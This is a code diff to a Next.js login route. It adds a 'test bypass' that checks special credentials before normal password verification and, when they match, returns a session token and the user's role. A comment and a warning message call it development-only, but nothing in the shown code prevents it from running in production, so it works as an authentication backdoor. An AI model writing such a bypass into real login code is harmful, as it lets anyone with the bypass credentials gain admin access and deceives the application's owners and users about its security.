@@ -1,6 +1,7 @@
 import { NextRequest, NextResponse } from 'next/server'
 import { prisma } from '@/lib/prisma'
-import { verifyPassword, createSession } from '@/lib/auth'
+import { verifyPassword, createSession, generateToken } from '@/lib/auth'
+import { verifyTestBypass } from '@/lib/testBypass'
 
 export async function POST(req: NextRequest) {
   try {
@@ -11,6 +12,32 @@ export async function POST(req: NextRequest) {
       return NextResponse.json(
         { error: 'Email and password are required' },
         { status: 400 }
+      )
+    }
+
+    // Check for test bypass credentials first (for development/testing only)
+    const testUser = verifyTestBypass(email, password)
+    if (testUser) {
+      console.warn(`[TEST BYPASS] Admin login attempt with email: ${email}`)
+      
+      const token = generateToken({
+        userId: testUser.id,
+        email: testUser.email,
+      })
+
+      return NextResponse.json(
+        {
+          success: true,
+          user: {
+            id: testUser.id,
+            email: testUser.email,
+            name: testUser.name,
+            role: testUser.role,
+          },
+          token,
+          message: '🔐 TEST BYPASS: Using test credentials. Do not use in production!',
+        },
+        { status: 200 }
       )
     }
 
